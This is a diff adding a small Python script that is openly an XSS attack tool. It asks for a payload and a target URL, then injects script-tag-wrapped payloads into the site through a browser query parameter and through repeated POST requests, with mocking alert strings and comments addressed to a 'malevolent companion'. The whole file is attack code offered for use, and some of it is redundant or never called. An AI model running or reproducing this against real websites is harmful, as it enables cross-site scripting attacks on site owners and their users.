@@ -1,0 +1,73 @@
+payload = input("Enter your wicked XSS payload: ")
+url = input("Enter your wicked XSS url: ")
+def a():
+    import webbrowser
+
+    def generate_malicious_link(payload):
+        # Craft your malicious payload here
+        malicious_link = f"<script>{payload}</script>"
+        return malicious_link
+
+    def execute_xss_attack(url, payload):
+        # Generate the malicious link
+        malicious_link = generate_malicious_link(payload)
+
+        # Open the URL with the malicious payload
+        webbrowser.open(f"{url}?param={malicious_link}")
+
+    # Example usage
+    
+    execute_xss_attack(url, "alert('Shiter has arrived!')")
+def b():
+    import requests
+
+    def inject_xss(url, payload):
+        script = f"<script>{payload}</script>"
+        response = requests.post(url, data={"input": script})
+        return response.text
+
+
+    
+
+    result = inject_xss(url, payload)
+    print(result)
+
+def c():
+    import requests
+
+    def inject_payload(url, payload):
+        script_tag = "<script>{}</script>".format(payload)
+        response = requests.post(url, data={"input": script_tag})
+        return response.text
+
+    if __name__ == "__main__":
+        result = inject_payload(url,payload)
+        print("Result:", result)
+
+def d():
+    import requests
+
+    def inject_xss(url, payload):
+        script_tag = "<script>{}</script>".format(payload)
+        response = requests.post(url, data={"input": script_tag})
+        
+        # Do with the response as you please, my malevolent companion
+        return response.text
+
+    # Example usage
+    
+    xss_payload = "alert('Shiter laughter echoes...')"
+
+    response_text = inject_xss(url, xss_payload)
+    print(response_text)
+
+
+
+def main():
+    a()
+    b()
+    c()
+
+    
+if __name__=="__main__":
+    main()
